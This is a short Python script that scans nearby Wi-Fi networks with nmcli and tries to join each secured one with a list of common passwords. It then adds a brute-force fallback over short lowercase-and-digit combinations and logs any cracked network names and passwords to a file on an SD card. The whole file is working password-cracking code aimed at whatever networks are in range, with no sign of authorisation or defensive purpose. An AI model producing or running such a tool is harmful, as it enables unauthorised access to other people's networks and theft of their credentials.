import subprocess, time, os

WORDLIST = [
 "12345678","password","123456789","1234567890","qwertyuiop","admin123",
 "wifi1234","internet","letmein","welcome1","password1","11111111",
 "00000000","87654321","iloveyou","monkey123","dragon123","sunshine1",
 "princess1","football1","baseball1","qwerty123","abc12345","password123",
 "admin","root","toor","passw0rd","p@ssw0rd","welcome","hello123",
 "charlie1","donald123","password1!","qwerty","letmein123","trustno1",
 "1q2w3e4r","zaq1xsw2","123qweasd","qazwsxedc","1234abcd","abcd1234",
 "wifi","wlan","router","modem","default","guest","user","test1234",
]

def scan():
    out = subprocess.check_output(["nmcli","-t","-f","SSID,SECURITY,SIGNAL","dev","wifi"], text=True, stderr=subprocess.DEVNULL)
    nets = []
    for line in out.splitlines():
        parts = line.split(":")
        if len(parts) >= 3 and parts[0]:
            nets.append((parts[0], parts[1], parts[2]))
    return nets

def try_connect(ssid, pw):
    subprocess.run(["nmcli","dev","wifi","connect",ssid,"password",pw], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    r = subprocess.run(["nmcli","-t","-f","ACTIVE,SSID","dev","wifi"], capture_output=True, text=True)
    for line in r.stdout.splitlines():
        if line.startswith("yes:") and line.split(":",1)[1] == ssid:
            return True
    return False

def main():
    nets = scan()
    print("found", len(nets), "networks")
    for ssid, sec, sig in nets:
        print(f"\n== {ssid} ({sec}) {sig}%")
        if "WPA" not in sec and "WEP" not in sec:
            print("  open network")
            continue
        found = False
        for pw in WORDLIST:
            print(f"  trying {pw}", end="\r")
            if try_connect(ssid, pw):
                print(f"\n  FOUND: {ssid} -> {pw}")
                found = True
                break
        if not found:
            print("\n  not in wordlist")

if __name__ == "__main__":
    main()


# resume + brute force fallback
import itertools, string

def brute(ssid, maxlen=8):
    chars = string.ascii_lowercase + string.digits
    for n in range(6, maxlen+1):
        for combo in itertools.product(chars, repeat=n):
            pw = "".join(combo)
            if try_connect(ssid, pw):
                print(f"\n  FOUND: {ssid} -> {pw}")
                with open("/mnt/sdcard/wifi/found.txt","a") as f:
                    f.write(f"{ssid}:{pw}\n")
                return True
    return False
